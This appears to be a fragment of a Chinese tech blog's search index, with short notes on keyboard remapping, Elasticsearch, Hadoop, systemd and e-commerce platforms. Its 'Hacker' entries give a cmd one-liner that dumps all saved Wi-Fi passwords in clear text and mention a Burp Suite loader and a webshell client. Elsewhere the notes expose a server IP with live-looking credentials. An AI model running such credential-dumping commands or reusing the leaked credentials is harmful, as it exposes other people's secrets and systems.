modifier\nkeycode 66 –  CapsLock –  lock\n查看键位信息\n输出现在所有keycode -  keysym的映射(Keymap table), 其中keysym以字符形式表示\n\n 扫描码(scancode)是一个键的最小识别 ID。如果一个键没有扫描码值，我们无法做任何事，因为内核看不到它。\nxev\nkeycode 38 (keysym 0x61, a)\nkeycode 9 (keysym 0xff1b, Escape)\nkeycode 23 (keysym 0xff09, Tab)\nkeycode 36 (keysym 0xff0d, Return)\nkeycode 37 (keysym 0xffe3, ControlL)\nkeycode 50 (keysym 0xffe1, ShiftL)\nkeycode 62 (keysym 0xffe2, ShiftR)\nkeycode 64 (keysym 0xffe9, AltL)\nkeycode 66 (keysym 0xffe5, CapsLock)\nkeycode 105 (keysym 0xffe4, ControlR)\nkeycode 108 (keysym 0xffea, AltR)\nkeycode 133 (keysym 0xffeb, SuperL)\nkeycode 134 (keysym 0xffec, SuperR)\nkeycode 135 (keysym 0xff67, Menu)\nxmodmap -pke\nkeycode  36 = Return NoSymbol Return\nkeycode  37 = ControlL NoSymbol ControlL\nkeycode  50 = ShiftL NoSymbol ShiftL\nkeycode 133 = SuperL NoSymbol SuperL\nkeycode 134 = SuperR NoSymbol SuperR\nkeycode 135 = Menu NoSymbol Menu\n\n键位码(keycode)是一个键的第二级识别 ID，对应到一个函数。\nsudo showkeys\nsudo showkeys -a\n\n符号(symbol)是一个键的第三级识别 ID，Xorg 通过该 ID 引用按键。\n\nsudo showkeys\nsudo dumpkeys\nsudo loadkeys\n\n linux修改键盘映射capslock为ctrl\nsudo apt-get install xmodmap\nsudo apt-get install x11-xserver-utils\n\n在自己的工作目录home里新建一个.xmodmaprc的文件\nvim .xmodmaprc\nremove Lock = CapsLock\nremove Control = ControlR\nkeysym ControlR = CapsLock\nkeysym CapsLock = ControlR\nadd Lock = CapsLock\nadd Control = ControlR\n执行\nxmodmap .xmodmaprc\n/bin/bash -c \"sleep 20; /usr/bin/xmodmap /home/$USER/.Xmodmap\"\nfcitx-xkb覆盖掉了xmodmap，把xkb禁用就好了\n\n用~$ xev |grep keycode 按要互换的两个键的到以下信息：\n\n1 state 0×50, keycode 133 (keysym 0xffeb, SuperL), samescreen YES, 2 state 0×10, keycode 66(keysym 0xffe5, CapsLock), samescreen YES,然后建立 .Xmodmap 输入以下内容\n\n1 clear mod4 2 clear lock 3 keycode 133 = CapsLock NoSymbol CapsLock NoSymbol CapsLock 4 keycode 66 = SuperL NoSymbol SuperL NoSymbol SuperL 5 add mod4 = SuperL 6 add lock = CapsLock最后执行 xmodmap .xmodmap \u0026\u0026 exec awesome即可生效。\n\nsetxkbmap -option ctrl:swapcaps\nSwap left ctrl and alt in Linux - CodeWeblog.com\nsetxkbmap选项位于这几个文件里： /usr/share/X11/xkb/rules/evdev.lst /usr/share/X11/xkb/rules/base.lst，这俩文件一模 一样……，利用grep搜索过滤\"ctrl:或:ctrl\"。\n\n$ grep -e \"ctrl:\\|:ctrl\" /usr/share/X11/xkb/rules/evdev.lst\n\ngrp:ctrlstoggle     Both Ctrl keys together\ngrp:ctrlshifttoggle Ctrl+Shift\ngrp:ctrlalttoggle  Alt+Ctrl\nctrl:nocaps          Caps Lock as Ctrl\nctrl:lctrlmeta      Left Ctrl as Meta\nctrl:swapcaps        Swap Ctrl and Caps Lock\nctrl:acctrl         At left of 'A'\nctrl:aactrl         At bottom left\nctrl:rctrlralt      Right Ctrl as Right Alt\nctrl:menurctrl      Menu as Right Ctrl\nctrl:ctrlralt       Right Alt as Right Ctrl\ncaps:ctrlmodifier   Make Caps Lock an additional Control but keep the CapsLock keysym\naltwin:ctrlwin      Control is mapped to Win keys (and the usual Ctrl keys)\naltwin:ctrlaltwin  Control is mapped to Alt keys, Alt is mapped to Win keys\nterminate:ctrlaltbksp Control + Alt + Backspace\n我选择了ctrl:nocaps，执行dconf-editor, 在org.gnome.desktop.inputsources下面， xkboptions选项，添加如下：['ctrl:nocaps']，OK.若需立即生效，终端键入 setxkbmap -print即可。\n\nman xkeyboard-config\nsudo vi /etc/default/keyboard\n找到“XKBOPTIONS”，加入“ctrl:swapcaps”来交换Caps Lock和Control键。如果还要加入其他的选项，中间可以用英文逗号隔开。\n\nXKBOPTIONS=\"ctrl:nocaps\"\n\n最后需要执行\n\nsudo dpkg-reconfigure keyboard-configuration\n\n这样修改以后，图形界面和虚拟终端下（例如Ctrl+Alt+F1）都可以起作用。而通过gnome-tweak-tool修改的只能在图形界面下起作用。\n\nUbuntu 14.04 下通过 XKB 修改键盘映射, 实现自定义按键\n\nXKB :  全称 X Keyboard Extension, 是 Liunx 下管理键盘输入的一套较为复杂的系统.\nUbuntu 14.04 采用这套系统来支持图形界面下的键盘管理.\n\n几个基本概念\nkey code : 键盘上按键的物理代号或者说是物理座标， 比如Q键是 AD01, 我们可以改变它的映射，让Q键变成A键， 但是这个键的 Key code 还是 AD01。\n\nkey symbols : 表示按键的实际意义， 比如 AD01 只是一个键盘上按键的位置， 而字母Q是一个具有实际意义的符号, 当 key code 和 key symbols 建立关联后, 按下 AD01 位置的按键, 就会输入一个字母 Q.\n\n按键和符号建立了联系, 可是, 我们一个按键上可不止一种符号.  比如, 小写的 q 和 大写的 Q 都是在一个按键上, 这就需要引入以下的概念了\n\nlevel : 我们键盘上的按键, 通常都是通过切换 level 来实现的, 比如 小写字母是 level 1 , 而大写字母是 level 2. 通常只有 2 个 level , 但是我们也可以增加更多的 level 来让一个按键可以表示更多的意义.\n\ngroup :  作用类似于 level, 但一般是用于切换整个字符集. 比如要用键盘输入日语啥的.\n\nmodifier key :  起修饰作用的键, 比如常见的 Shift,  Ctrl, Caps Lock 都属于修饰键.\n\n 基本的配置修改步骤\n\n  这里以我自己的使用习惯为例, 介绍一下 xkb 的比较简单的配置修改方式. 注意这并不是唯一的修改方式.\n\n使用命令查看当前的键盘方案 : setxkbmap -print\n\n我这里显示的是:\nxkbkeymap {\n\txkbkeycodes  { include \"evdev+aliases(qwerty)\"\t};\n\txkbtypes     { include \"complete\"\t};\n\txkbcompat    { include \"complete\"\t};\n\txkbsymbols   { include \"pc+us+inet(evdev)\"\t};\n\txkbgeometry  { include \"pc(pc105)\"\t};\n};\n\n留意 xkbsymbols 这行, 其中显示是  pc + us. 说明我们需要修改的就是这两个 symbols 文件 inet 一般用不到.\n\n根据之前介绍的概念, 我们修改按键映射, 其实就是修改 key code 和 key symbols 之间的映射关系, 这个映射关系主要保存在以下路径下:\n\n配置文件的位置 :  /usr/share/X11/xkb/symbols/\n\n在以上路径下可以找到 pc 和 us 两个文件.  \n\n  强调一下: 注意备份原始的配置文件, 否则改键失败有可能只能重装系统了\n\n使用 vim 等编辑器打开 pc 文件, 会看到类似如下结构\n\ndefault  partial alphanumerickeys modifierkeys\nxkbsymbols \"pc105\" {\n\tinclude \"pc(editing)\"\n\tkey LCTL {  [ Control_L ]  };\n};\n\n其中前两行的部分是这个区块的头, 可以类比与编程语言中函数或方法的概念. 那这两行其实就是函数(方法)的声明(签名).\n\n花括号中的部分是主体内容.\n\ninclude 的功能就是其字面意思, 将其他部分的内容包含进来. 小括号左边的部分即例子中的 pc , 其实就是当前我们编辑的这个文件, 当然他也可以是别的 symbols 文件夹下的文件名. 而小括号内的部分是前面的名称指定的文件中的一个区块名称. 这里引入的是 pc 中的 editing 区块, 它其实就在这个文件的最后面.  而我们当前所在的区块, 按照这种命名方式就应该是  pc(pc105) 了.\n\n第四行就是定义按键实际意义的部分了. 左边的格式固定为  key key code, 表示要定义哪个物理按键. 右边的花括号中包含其按键意义, 一个中括号是一个 group, 也可以定义多个 group, 可以这样跟在后面写， 中括号内是不同 Level 的意义, level 的个数最多支持 8 个:\nkey xxx { [ level 1 , level 2, level3, ... ],\n\t\t\t[ level 1 , level 2 ] }\n`","tags":null},{"location":"//blog.pytool.com/Hacker/2016-03-29 BurpSuite","title":"BurpsSuite","text":"Windows 下启动 BurpsSuite\njava.exe -cp BurpLoader.jar;burpsuiteprov1.7.03.jar larry.lau.BurpLoader\njava -jar BurpLoader.jar\njava -cp BurpLoader.jar;burpsuitepro.jar larry.lau.BurpLoader\njava -cp BurpLoader.jar:burpsuitepro.jar larry.lau.BurpLoader\n\njava -jar Cknife.jar \nPortSwigger CA\nBurp Suite使用介绍\nbook burpsuite实战指南\nBurp Suite 官方文档中文版\n\njava -jar BurpLoader.jar --help\n插件安装目录\n~/.Burpsuite/bapps/\n\n [Intercept 拦截规则]\n[Intruder 自动攻击]\n\nCreating a Custom CA Certificate\n\nYou can use the following OpenSSL commands to create a custom CA certificate with your own details, such as CA name:\n\nopenssl req -x509 -days 730 -nodes -newkey rsa:2048 -outform der -keyout server.key -out ca.der\n\n[OpenSSL will prompt you to enter various details for the certificate. Be sure to enter suitable values for all the prompted items.]\n\nopenssl rsa -in server.key -inform pem -out server.key.der -outform der\n\nopenssl pkcs8 -topk8 -in server.key.der -inform der -out server.key.pkcs8.der -outform der -nocrypt\n\nThen click on the \"Import / export CA certificate\" button in Burp, and select \"Cert and key in DER format\". Select ca.der as the certificate file, and server.key.pkcs8.der as the key file. Burp will then load the custom CA certificate and begin using it to generate per-host certificates.","tags":null},{"location":"//blog.pytool.com/Post/电商/2016-06-01 职业教育","title":"职业教育解决方案","text":"瑞森教育 http://www.1234567890.cc\n 功能比较全，但是比较老气 研发风格不适合现代。代表网站 中国职教城网 http://www.vecity.cn/\n\n慕课先生 http://mooc.101.com/\n  视频教育 偏向于职业教育大学 公共课程,\n\n智慧职教 http://www.icve.com.cn\n  视频教育 专业课程\n\n行知学徒网 http://www.ixueto.com\n  视频直播教育 偏职业教育专业课程\n\n职教mooc http://www.icourses.cn/vemooc/\n   视频教育 公共课程+专业课程\n\n山东职业教育平台 http://zyjy.sdei.edu.cn\n\n   中国职业教育云平台 http://www.worlduc.com/zhijiao/index.aspx","tags":null},{"location":"//blog.pytool.com/Hardware/2015-12-03 STM32-TIM定时器","title":"STM32_TIM定时器","text":"名词解释：\n\n1.单脉冲模式 One Pulse mode\nTIMSelectOnePulseMode(TIM2, TIMOPModeSingle)//设置TIM2在单脉冲模式，且是单一的脉冲，在下一个更新事件停止\n\n关于始终的思考: 如何保证精确延时.","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04 [Elasticsearch技巧]指定其他字段为主键_id字段","title":"elasticsearch指定其他字段为主键_id字段","text":"The Great Mapping Refactoring\n用了这么久的elasticsearch,一直以为es只有对id字段进行赋值的方法来使用主键进行去重,今天才发现原来id也可以指定为其他字段,\n\nes会自动将指定字段的值,赋值给id字段,这样就比较方便了.这里记录一下:\n\n这里直接索引库和mapping一起创建:\ncurl -XPOST localhost:9200/test -d '{\n \"settings\" : {\n     \"numberofshards\" : 1,\n     \"numberofreplicas\":0\n },\n \"mappings\" : {\n     \"test1\" : {\n         \"id\":{\"path\":\"mainkey\"},\n         \"source\" : { \"enabled\" : false },\n         \"properties\" : {\n             \"mainkey\" : { \"type\" : \"string\", \"index\" : \"notanalyzed\" }\n         }\n     }\n }\n}'\n然后看一下mapping如下:\n\n然后插入一条数据:\ncurl -XPOST localhost:9200/test/test1 -d'\n{\n\"mainkey\":\"aaa\"\n}'\n然后查询:\n\n这样,就完成了.","tags":null},{"location":"//blog.pytool.com/Post/hadoop/2017-07-01 Hadoop添加节点datanode","title":"hadoop添加datanode","text":"配置新节点上的hosts\n修改namenode节点上conf/slaves文件，增加新节点域名\n在新节点上启动服务\n[hadoop@slave4 hadoop-1.0.4]# ./bin/hadoop-daemon.sh start datanode\n[hadoop@slave4 hadoop-1.0.4]# ./bin/hadoop-daemon.sh start tasktracker\n复制代码\n\n均衡block\n这个会非常耗时\n1) 如果不balance，那么cluster会把新的数据都存放在新的node上，这样会降低mapred的工作效率\n2) 设置平衡阈值，默认是10%，值越低各节点越平衡，但消耗时间也更长\n[hadoop@slave4 hadoop-1.0.4]# ./bin/start-balancer.sh -threshold 5\n复制代码\n3）设置balance的带宽，默认只有1M/s\nproperty\nnamedfs.balance.bandwidthPerSec/name\nvalue1048576/value\n/property\n复制代码\n\n注意：\n必须确保slave的firewall已关闭;\n确保新的slave的ip已经添加到master及其他slaves的/etc/hosts中，反之也要将master及其他slave的ip添加到新的slave的/etc/hosts中","tags":null},{"location":"//blog.pytool.com/Hacker/2016-03-29 Kali","title":"Kali","text":"Kali \n$ wget -q -O - https://www.kali.org/archive-key.asc | gpg --import\nor...\n$ gpg --keyserver hkp://keys.gnupg.net --recv-key 7D8D0BF6\n   ...and verify that the displayed fingerprint matches the one below\n$ gpg --list-keys --with-fingerprint 7D8D0BF6\n  pub 4096R/7D8D0BF6 2012-03-05 [expires: 2018-02-02]\n  Key fingerprint = 44C6 513A 8E4F B3D3 0875 F758 ED44 4FF0 7D8D 0BF6\n  uid Kali Linux Repository devel@kali.org\n  sub 4096R/FC0D0DCB 2012-03-05 [expires: 2018-02-02]\n\ngpg --verify SHA1SUMS.gpg SHA1SUMS\n  gpg: Signature made Thu Mar 7 21:26:40 2013 CET using RSA key ID 7D8D0BF6\n  gpg: Good signature from \"Kali Linux Repository devel@kali.org\"\n`","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/container_ring","title":"golang中container/ring包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04 elastic 基础 ","title":"elastic 基础","text":"查看集群状态\ncurl -u elastic:changeme '120.92.36.21:9200/cat/nodes?v'\ncurl -u elastic:changeme '127.0.0.1:9200/cat/nodes?v'\n\n 列出所有index\ncurl -u elastic:changeme '120.92.36.21:9200/cat/indices?v'\n\ncurl -XPUT -u elastic:changeme '120.92.36.21:9200/template/mysqlbeat -d@/etc/mysqlbeat/mysqlbeat.template.json'\n\ncurl -u elastic:changeme '120.92.36.21:9200/cat'\n/cat/allocation\n/cat/shards\n/cat/shards/{index}\n/cat/master\n/cat/nodes\n/cat/tasks\n/cat/indices\n/cat/indices/{index}\n/cat/segments\n/cat/segments/{index}\n/cat/count\n/cat/count/{index}\n/cat/recovery\n/cat/recovery/{index}\n/cat/health\n/cat/pendingtasks\n/cat/aliases\n/cat/aliases/{alias}\n/cat/threadpool\n/cat/threadpool/{threadpools}\n/cat/plugins\n/cat/fielddata\n/cat/fielddata/{fields}\n/cat/nodeattrs\n/cat/repositories\n/cat/snapshots/{repository}\n/cat/templates\n\ncurl -u elastic:changeme '120.92.36.21:9200/cat/?help'\n通过h参数设置显示的header Headers\nGET /cat/nodes?h=ip,port,heapPercent,name\n\nelasticsearch.yml   path.repo: [\"/etc/elasticsearch/backup\"] \u003c\u003c EOF\n\ncurl -XPUT 'http://120.92.36.21:9200/snapshot/backup' -d '{\n \"type\": \"fs\",\n \"settings\": {\n     \"location\": \"/etc/elasticsearch/backup\",\n     \"compress\": true\n  }\n}'\n\ncurl -XPUT http://120.92.36.21:9200/snapshot/backup/snapshot1?waitforcompletion=true\n\n快照备份\ncurl -XPUT -u elastic:P@ssw0rd http://120.92.36.21:9200/snapshot/backup/snapshotdate +%Y.%m.%d?waitforcompletion=true \u0026\u0026 curl -XDELETE -u elastic:infra321 http://120.92.36.21:9200/access-date +%Y.%m.%d -d \"-31 day\"\ncurl -XDELETE http://120.92.36.21:9200/access-date +%Y.%m.%d -d \"-1 day\"\ncuratorcli --host 192.168.19.12 snapshot --repository backup\n\n 查看文档数量\ncurl -u elastic:changeme 120.92.36.21:9200/.kibana/_count?pretty","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elastic","title":"Awesome Elasticsearch","text":"虚拟内存低 ElasticSearch 无法启动\n默认操作系统的mmap设置较低，会导致内存溢出：\n$ vim /etc/sysctl.conf\n添加\necho vm.maxmapcount=262144   /etc/sysctl.d/elastic.conf\n$ sysctl vm.maxmapcount\nbeats 安装\nhttps://www.elastic.co/guide/en/beats/metricbeat/current/setup-repositories.html\n 导入证书\nsudo rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch","tags":null},{"location":"//blog.pytool.com/Linux/2016-01-01 Linux 系统开机启动项清理","title":"Linux 系统开机启动项清理","text":"Linux 系统开机启动项清理 - IT程序猿\n一般情况下，常规用途的 Linux 发行版在开机启动时拉起各种相关服务进程，包括许多你可能无需使用的服务，例如蓝牙bluetooth、Avahi、 调制解调管理器ModemManager、ppp-dns（LCTT 译注：此处作者笔误 ppp-dns 应该为 pppd-dns) 等服务进程，这些都是什么东西？用于哪里，有何功能？\n\nSystemd 提供了许多很好的工具用于查看系统启动情况，也可以控制在系统启动时运行什么。在这篇文章中，我将说明在 Systemd 类发行版中如何关闭一些令人讨厌的进程。\n查看开机启动项\n\n在过去，你能很容易通过查看 /etc/init.d 了解到哪些服务进程会在引导时启动。Systemd 以不同的方式展现，你可以使用如下命令罗列允许开机启动的服务进程。\n1\n2\n3\n4\n5\n6\n7\n8\n\n$ systemctl list-unit-files --type=service | grep enabled\naccounts-daemon.service                    enabled\nanacron-resume.service                     enabled\nanacron.service                            enabled\nbluetooth.service                          enabled\nbrltty.service                             enabled\n[...]\n\n在此列表顶部，对我来说，蓝牙服务是冗余项，因为在该电脑上我不需要使用蓝牙功能，故无需运行此服务。下面的命令将停止该服务进程，并且使其开机不启动。\n1\n2\n3\n\n$ sudo systemctl stop bluetooth.service\n$ sudo systemctl disable bluetooth.service\n\n你可以通过下面命令确定是否操作成功。\n1\n2\n3\n4\n5\n6\n\n$ systemctl status bluetooth.service\n bluetooth.service - Bluetooth service\n  Loaded: loaded (/lib/systemd/system/bluetooth.service; disabled; vendor preset: enabled)\n  Active: inactive (dead)\n    Docs: man:bluetoothd(8)\n\n停用的服务进程仍然能够被另外一个服务进程启动。如果你真的想在任何情况下系统启动时都不启动该进程，无需卸载该它，只需要把它掩盖起来就可以阻止该进程在任何情况下开机启动。\n1\n2\n3\n\n$ sudo systemctl mask bluetooth.service\n Created symlink from /etc/systemd/system/bluetooth.service to /dev/null.\n\n一旦你对禁用该进程启动而没有出现负面作用感到满意，你也可以选择卸载该程序。\n\n通过执行命令可以获得如下服务列表：\n1\n2\n3\n4\n5\n6\n7\n\n$ systemctl list-unit-files --type=service                       \nUNIT FILE                                  STATE   \naccounts-daemon.service                    enabled\nacpid.service                              disabled\nalsa-restore.service                       static    \nalsa-utils.service                         masked\n\n你不能启用或禁用静态服务，因为静态服务被其他的进程所依赖，并不意味着它们自己运行。\n哪些服务能够禁止？\n\n如何知道你需要哪些服务，而哪些又是可以安全地禁用的呢？它总是依赖于你的个性化需求。\n\n这里举例了几个服务进程的作用。许多服务进程都是发行版特定的，所以你应该看看你的发行版文档（比如通过 google 或 StackOverflow）。\n\n    accounts-daemon.service 是一个潜在的安全风险。它是 AccountsService 的一部分，AccountsService 允许程序获得或操作用户账户信息。我不认为有好的理由能使我允许这样的后台操作，所以我选择掩盖mask该服务进程。\n\n    avahi-daemon.service 用于零配置网络发现，使电脑超容易发现网络中打印机或其他的主机，我总是禁用它，别漏掉它。\n\n    brltty.service 提供布莱叶盲文设备支持，例如布莱叶盲文显示器。\n\n    debug-shell.service 开放了一个巨大的安全漏洞（该服务提供了一个无密码的 root shell ，用于帮助 调试 systemd 问题），除非你正在使用该服务，否则永远不要启动服务。\n\n    ModemManager.service 该服务是一个被 dbus 激活的守护进程，用于提供移动宽频broadband（2G/3G/4G）接口，如果你没有该接口，无论是内置接口，还是通过如蓝牙配对的电话，以及 USB 适配器，那么你也无需该服务。\n\n    pppd-dns.service 是一个计算机发展的遗物，如果你使用拨号接入互联网的话，保留它，否则你不需要它。\n\n    rtkit-daemon.service 听起来很可怕，听起来像是 rootkit。 但是你需要该服务，因为它是一个实时内核调度器real-time kernel scheduler。\n\n    whoopsie.service 是 Ubuntu 错误报告服务。它用于收集 Ubuntu 系统崩溃报告，并发送报告到 https://daisy.ubuntu.com 。 你可以放心地禁止其启动，或者永久的卸载它。\n\n    wpasupplicant.service 仅在你使用 Wi-Fi 连接时需要。\n\n系统启动时发生了什么？\n\nSystemd 提供了一些命令帮助调试系统开机启动问题。该命令会重演你的系统启动的所有消息。\n\n$ journalctl -b\n\n-- Logs begin at Mon 2016-05-09 06:18:11 PDT,\nend at Mon 2016-05-09 10:17:01 PDT. --\nMay 16 06:18:11 studio systemd-journal[289]:\nRuntime journal (/run/log/journal/) is currently using 8.0M.\nMaximum allowed usage is set to 157.2M.\nLeaving at least 235.9M free (of currently available 1.5G of space).\nEnforced usage limit is thus 157.2M.\n[...]\n\n通过命令 journalctl -b -1 可以复审前一次启动，journalctl -b -2 可以复审倒数第 2 次启动，以此类推。\n\n该命令会打印出大量的信息，你可能并不关注所有信息，只是关注其中问题相关部分。为此，系统提供了几个过滤器，用于帮助你锁定目标。让我们以进程号为 1 的进程为例，该进程是所有其它进程的父进程。\n\n$ journalctl PID=1\n\nMay 08 06:18:17 studio systemd[1]: Starting LSB: Raise network interfaces....\nMay 08 06:18:17 studio systemd[1]: Started LSB: Raise network interfaces..\nMay 08 06:18:17 studio systemd[1]: Reached target System Initialization.\nMay 08 06:18:17 studio systemd[1]: Started CUPS Scheduler.\nMay 08 06:18:17 studio systemd[1]: Listening on D-Bus System Message Bus Socket\nMay 08 06:18:17 studio systemd[1]: Listening on CUPS Scheduler.\n[...]\n\n这些打印消息显示了什么被启动，或者是正在尝试启动。\n\n一个最有用的命令工具之一 systemd-analyze blame，用于帮助查看哪个服务进程启动耗时最长。\n\n$ systemd-analyze blame\n         8.708s gpu-manager.service\n         8.002s NetworkManager-wait-online.service\n         5.791s mysql.service\n         2.975s dev-sda3.device\n         1.810s alsa-restore.service\n         1.806s systemd-logind.service\n         1.803s irqbalance.service\n         1.800s lm-sensors.service\n         1.800s grub-common.service\n\n这个特定的例子没有出现任何异常，但是如果存在系统启动瓶颈，则该命令将能发现它。\n\n你也能通过如下资源了解 Systemd 如何工作：\n\n    理解和使用 Systemd\n\n    介绍 Systemd 运行级别和服务管理命令\n\n    再次前行，另一个 Linux 初始化系统：Systemd 介绍","tags":null},{"location":"//blog.pytool.com/Post/电商/2016-06-01 跨境电商解决方案","title":"跨境电商解决方案","text":"eBay投资的电子商务系统Magento\nNo.1的电子商务系统：Magento\nMagento （麦进斗） 是一套专业开源的电子商务系统。Magento设计得非常灵活，具有模块化架构体系和丰富的功能。易于与第三方应用系统无缝集成。其面向企业级应用，可处理各方面的需求，以及建设一个多种用途和适用面的电子商务网站。 包括购物、航运、产品评论等等，充分利用开源的特性，提供代码库的开发，非常规范的标准，易于与第三方应用系统无缝集成。\nMagento 系统在规划之初就是一个着眼于全球的系统，多语言、多店铺架构、自动更新的汇率系统，后端内置100多种语言，预置了世界各地主流的税收方式，预置世界范围内主要的信用卡通道。在全球有大量开发者为其贡献了超过6000多个功能扩展。任何商家（包括B2B、B2B2C、营销联盟、代销、酒店预订等）想要的功能或者商业模式都可以在Magento 找到答案。\n\n海豚村 http://www.haituncun.com/\n一网全城B2B2C商城 http://www.yiwang.com/\nmagento\n  http://www.360magento.com/\n  http://www.magentoucd.com\n\n  http://www.liqunshop.com/\n   https://www.amazon.cn\n   http://www.alibaba.com/\n   http://mall.cmbchina.com/\n   http://seoul.yougou.com/\n   http://www.yougou.com\n   http://www.zol.com/\n   http://www.yintai.com/\n   http://www.gomehigo.hk/\n   http://www.gome.com.cn/\n   http://www.moonbasa.com/\n   http://www.mi.com/index.html\n   https://www.ingping.com/\n\n   B2B\n   http://www.3566t.com/\n\n   http://www.11185.com.cn/\n   http://www.xmmmo.com/\n   http://www.zdcfw.com/\n\n  关于贸易平台\n  香港贸发局： 贸发网 http://www.hktdc.com/sc/\n  商路通：  http://www.3566t.com/\n  中东贸易平台 http://www.zdcfw.com/Default.aspx\n  进出口贸易网 http://www.xmmmo.com/\n\n  厂家：\n  http://www.100kit.com/website.html\n  http://www.yiwaimao.cn/h-col-128.html\n  http://www.lyuee.com/show/\n\n  作者：果瀚文\n  链接：https://www.zhihu.com/question/19635311/answer/75203443\n  来源：知乎\n  著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n  开源购物车/电商解决方案/外贸独立网店以下回答仅针对外贸电商Magento  众所周知的开源购物车软件.功能足够强大,但不容易上手.用Magento做跨境电商的独立网站需常备技术人员.PrestaShop  全球用户超230,000.强大,性能稳定,代码冗余少,运行效率高Zen Cart  著名的老牌的免费+开源购物车系统.Opencart 著名的老牌的免费+开源购物车系统.osCommerce 老牌的免费+开源购物车软件.7000+免费组件.用户数量庞大.nopCommerce 一款基于asp.net的高质量的开源的电商解决方案HHG  基于xt:Commerce的一款免费开源购物车系统,特色是使用一个后台轻松建立和管理多站点.Loaded 7  前端使用最新版Bootstrap框架,响应式,移动端出色,免费+开源.Spree Commerce 采用Ruby on rails开发,强大,灵活.全球超45,000商户使用Spree Commerce.xt:Commerce  一套稳定,成熟,优秀的开源购物车系统.源于德国.中文资料欠缺.Drupal Commerce  基于Drupal的电商解决方案.功能强大.免费+开源.X-Cart  老牌购物车系统.支持多达75+支付网关,全球33,000+商户使用X-cart.Shopware   社区版开源+免费. 源自德国.simpleCart(js) 基于JavaScript的轻量级购物车软件,无需数据库,懂Html即可.有技术背景的可以考虑使用开源购物车，在后期的运营过程中需要常备技术人员。无技术背景的可以考虑使用SaaS购物车，在后期的运营过程中不一定需要技术人员。(有则更好)出处：开源购物车/电商方案    http://dig.tools/os-shopping-cart/延伸：SaaS购物车/电商方案   http://dig.tools/shopping-cart/Wordpress电商方案      http://dig.tools/wp-ecommerce/其他免费跨境电商方案  http://dig.tools/free-ecommerce/","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/net_http","title":"golang中net/http包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 org-agenda","title":"Emacs org agenda","text":"org-download-image-dir \"~/Dropbox/org/statics\"\norg-download-image-html-width 600\ndropbox-org-directory-path \"~/Dropbox/org/notes\")\n\n(setq org-directory \"~/Dropbox/org\")\norg-default-notes-file \"~/Dropbox/org/Temp.org\"\n\n(setq org-directory \"~/Dropbox/org\")\n\norg-agenda-files (find-lisp-find-files \"~/Dropbox/org/\" \"\\.org$\")","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/net_ip","title":"golang中net包用法(二)--IP","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/hadoop/2017-07-01 hadoop","title":"hadoop安装","text":"干货】Apache Hadoop 2.8 完全分布式集群搭建超详细过程，实现NameNode HA、ResourceManager HA高可靠性\n目录：/root/hadoop-2.6.0/sbin\n启动yarn历史进程命令：./mr-jobhistory-daemon.sh start historyservice\n\n192.168.10.90-192.168.10.102\nroot info top .123\nhttp://192.168.8.240:8080/websitems-hadoop/\nadmin 123456\n\nhadoop安装\n1、下载安装包\n\twget http://mirrors.hust.edu.cn/apache/hadoop/common/stable2/hadoop-2.7.3.tar.gz\n2、解压\n\ttar -zvxf hadoop-2.7.3.tar.gz -C /usr/local/\n3、配置core-site.xml\n\tconfiguration\n\t\t!-- 指定hdfs的nameservice为ns1 --\n        property\n        namefs.defaultFS/name\n        valuehdfs://ns1//value\n        /property\n        !-- 指定hadoop临时目录 --\n        property\n        namehadoop.tmp.dir/name\n        value/usr/local/hadoop-2.7.3/tmp/value\n        /property\n        property\n        namedfs.journalnode.edits.dir/name\n        value/usr/local/hadoop-2.7.3/journal/value\n\t\t/property\n\t\t!-- 指定zookeeper地址 --\n        property\n        nameha.zookeeper.quorum/name\n        value10.130.213.53:2181,10.130.213.54:2181,10.130.213.55:2181/value\n        /property\n        property\n          namehadoop.native.lib/name\n          valuetrue/value\n          descriptionShould native hadoop libraries, if present, be used./description\n        /property\n\t/configuration\n4、配置hdfs-site.xml\n手动强制切换 sudo -u hdfs hdfs haadmin -transitionToActive/transitionToStandby\n\n?xml version=\"1.0\" encoding=\"UTF-8\"?\n?xml-stylesheet type=\"text/xsl\" href=\"configuration.xsl\"?\n","tags":null},{"location":"//blog.pytool.com/Post/算法/2015-03-29 消息摘要算法-HMAC算法 ","title":"HMAC 算法","text":"消息摘要算法-HMAC算法\nHMAC算法","tags":null},{"location":"//blog.pytool.com/Hacker/2016-03-29 Nginx SSL","title":"Nginx ssl","text":"How To Secure Nginx with Let's Encrypt on Ubuntu 14.04","tags":null},{"location":"//blog.pytool.com/Post/hadoop/2017-07-01 hadoop基础","title":"hadoop基础","text":"journalnode的作用是在HA的两个namenode之间保持editlog的共享同步。\n\nzookeeper用于两个namenode之间互相的错误感知（active的掉了，standby的可以看见）","tags":null},{"location":"//blog.pytool.com/Post/Elastic/Kibana/2016-10-04 Kibana 5.x 加强安全 ","title":"Kibana 5.x 加强安全","text":" Kibana 5.x 加强安全 ","tags":null},{"location":"//blog.pytool.com/Hacker/2016-03-29 Windows命令行.","title":"Windows 命令行技巧","text":"cmd 一键获取 所有连接过的wifi 密码每次用wzcook\nfor /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear","tags":null},{"location":"//blog.pytool.com/Hardware/2015-12-04 STM32-GPIO模式","title":"STM32_GPIO模式","text":"所有的开漏输出都需要接上拉电阻。\n\n ## 1、普通推挽输出（GPIOModeOutPP）:\n使用场合：一般用在0V和3.3V的场合。线路经过两个PMOS 和NMOS 管，负责上拉和下拉电流。\n使用方法：直接使用\n输出电平：推挽输出的低电平是0V，高电平是3.3V。\n2、普通开漏输出（GPIOModeOutOD）：\n使用场合：一般用在电平不匹配的场合，如需要输出5V的高电平。\n使用方法：就需要再外部接一个上拉电阻，电源为5V，把GPIO设置为开漏模式， 当输出高组态时，由上拉电阻和电源向外输出5V的电压。\n输出电平：在开漏输出模式时，如果输出为0，低电平，则使NMOS 导通，使输 